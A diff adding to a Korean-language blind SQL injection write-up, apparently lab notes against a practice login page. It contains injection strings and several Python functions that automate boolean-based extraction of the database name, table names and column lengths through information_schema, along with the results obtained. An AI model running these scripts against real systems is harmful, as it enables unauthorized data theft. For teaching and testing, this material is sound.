@@ -35,12 +35,125 @@ SELECT * FROM users WHERE id=''or 1=1 #' AND pw='$pw'
 
 Blind_SQL_Injection 이란 일반적인 SQL_Injection과 비슷하게 취약점을 이용하지만, 시간에 따른 응답 결과, 참과 거짓에 따른 응답 결과 등을 분석하여 정보를 얻는 방식입니다.
 
+**1. 데이터 베이스 이름 길이 찾기**
+
 로그인화면에서의 ID 입력란에 `' or 1=1 and length(database())=1#`을 입력해 보면 다음과같은 오류가 뜹니다.
 
 [blind 오류 1]
 
-이 때 숫자를 증가시켜가며 입력해보면 ![image](https://user-images.githubusercontent.com/66786006/221412637-947a9e49-4175-4c91-891d-9b0d6b6942b8.png)
+이 때 숫자를 증가시켜가며 입력해보면  `' or 1=1 and length(database())=4#` 에서 로그인에 성공하여 데이터베이스 이름의 길이가 4글자임을 알 수 있습니다.
 
+이러한 작업을 간편하게 하기위해 Burp Suite 의 Intruder 기능을 이용할 수 있습니다.
+
+[burp payload] , [payload setting]
+
+위와같이 증가시켜줄 부분을 정한 후 다음과 같이 1~10까지의 숫자를 넣는 설정을 한 후 결과 값을 보면 
+
+![image](https://user-images.githubusercontent.com/66786006/221413659-ae57300b-7280-41df-bbe2-ee799cca3dc5.png)
+
+4 에서 Length가 다른 하나를 확인 할 수 있습니다.
+
+**2. 데이터 베이스 이름 찾기**
+
+데이터 베이스의 이름을 찾기위해서는 `' or 1=1 and ascii(substring(database(), 1~4,1))= 65~128` 을 입력하여 알 수 있습니다. `1~4`와 `65~128`을 각각 넣어봐야 하는데 이를 위하여 위 방법과 동일하게 Burp Suite을 이용할 수 있고 python을 이용하여 자동화 툴을 만들 수 있습니다. 다음은 Blind_SQL_injection을 수행하는 blind_sql.py 코드의 일부 입니다.
+
+``` python
+def fun_2(len_db):
+    print('processing Fun_2...')
+    db_name = ""
+    for i in range(len_db):
+        for j in range(65, 128):
+            inj_str = f"' or 1=1 and ascii(substring(database(), {i+1}, 1)) = {j}#"
+            resp = requests.post(url, data=f"id={inj_str}&pw=pw&login=Login", headers={'Content-Type': 'application/x-www-form-urlencoded'})
+            if "invalid" not in resp.text:
+                db_name += chr(j)
+                break
+    print (f'DB name: {db_name}')
+ ```
+ 위 코드에서는 요청에대한 결과에서 `invalid` 단어가 없으면 결과에 글자가 추가되는 방식으로 만들었습니다. 이를 실행시켜보면 
+ 
+ [py db 이름]
+
+다음과같이 DB이름이 tree 임을 알아낼 수 있습니다.
+
+**3. 테이블의 길이, 개수 찾기**
+
+```python
+def fun_4(dbname):
+    print('processing Fun_4...')
+    col =[]
+    j = 0
+    while True:
+        i = 0
+        while i <=MAX_LENGTH:
+            SQLINJq = f"' or 1=1 and length((select table_name from information_schema.tables where table_schema='{dbname}' limit {j},1))={i}#"
+            req = requests.post(url,data=f"id={SQLINJq}&pw=pw&login=Login",headers={'Content-Type': 'application/x-www-form-urlencoded'})
+            if "invalid" not in req.text:
+                #print(f"success with {i}")
+                col.append(i)
+                break
+            i += 1
+        if i >50:
+            break
+        j += 1
+    print(col)
+    return col
+```
+각 테이블의 길이와 개수를 알기 위해서는 다음과같은 코드를 사용하였습니다. 1번과 유사한방법으로 테이블의 이름의 길이를찾고, 50글자가 넘는다면 없다고 생각하여 개수를 추측합니다.
+
+[fun4 결과]
+
+결과로는 5글자, 5글자로 총 2개의 결과가 나왔습니다. 
+
+**4. 각 테이블의 이름 찾기**
+```python
+def fun_5(dbname,table_len):
+    print('processing Fun_5...')
+    res=[]
+    for num_1 in range(len(table_len)):
+        col=[]
+        for num_2 in range(table_len[num_1]):
+            num_3 = 65
+            while True:
+                SQLINJq = f"' or 1=1 and ascii(substring((select table_name from information_schema.tables where  table_schema='{dbname}' limit {num_1},1),{num_2+1},1)) = {num_3}#"
+                req = requests.post(url,data=f"id={SQLINJq}&pw=pw&login=Login",headers={'Content-Type': 'application/x-www-form-urlencoded'})
+                if  "invalid" not in req.text:
+                    #print(f"success with {num_3}")
+                    col.append(chr(num_3))
+                    break
+                num_3 +=1
+        res.append(''.join(col))
+    print(res)
+    return res
+ ```
+ 2번과 유사한 방식으로 각 테이블의 이름을 찾을 수 있습니다. 입력값의 table_len 값은 3번의 출력과 동일한 [5, 5]로 입력합니다.
+ 
+ [fun 5]
+ 
+ 테이블의 이름은 각각 board, usesrs 임을 알 수 있습니다.
+ 
+ **5. 각 테이블별 컬름이름 길이 찾기**
+ ```python
+ def fun_6(table_name):
+    print('processing Fun_6...')
+    res = []
+    for name in table_name:
+        col = []
+        num_1, num_2 = 0, 0
+        while num_2 <= MAX_LENGTH:
+            SQLINJq = f"' or 1=1 and length((select column_name from information_schema.columns where table_name='{name}' limit {num_1},1))={num_2}#"
+            req = requests.post(url, data=f"id={SQLINJq}&pw=pw&login=Login", headers={'Content-Type': 'application/x-www-form-urlencoded'})
+            if 'invalid' not in req.text:
+                #print(f"success with {num_2}")
+                col.append(num_2)
+                num_1, num_2 = num_1+1, 0
+            else:
+                num_2 += 1
+        res.append(col)
+    print(res)
+    return res
+ ```
+ㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡ 여기서 부터 수정
 
 ## 게시판 화면
 
